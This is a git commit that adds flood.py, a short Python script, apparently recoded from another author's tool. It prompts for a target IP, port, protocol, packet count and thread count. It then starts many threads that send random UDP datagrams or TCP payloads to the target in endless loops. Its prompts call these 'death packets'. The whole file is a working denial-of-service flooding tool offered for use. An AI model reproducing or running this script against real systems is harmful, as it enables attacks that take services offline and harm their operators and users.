26c65bfdecdee2f0e03007c3cf92f905fe3be494
dikzxz <83471505+dikzxz@users.noreply.github.com>
2021-05-09 07:10:57 +0700

    Add files via upload

---
+++ flood.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+#Code by LeeOn123 Recode Dikz
+import random
+import socket
+import threading
+
+print("--> ReC0de By Dikz <--")
+print("#-- TCP/UDP FLOOD --#")
+ip = str(input(" IP TARGET LU:"))
+port = int(input(" Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket kematian:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" PAKET DATANG")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" PAKET KEMATIAN")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
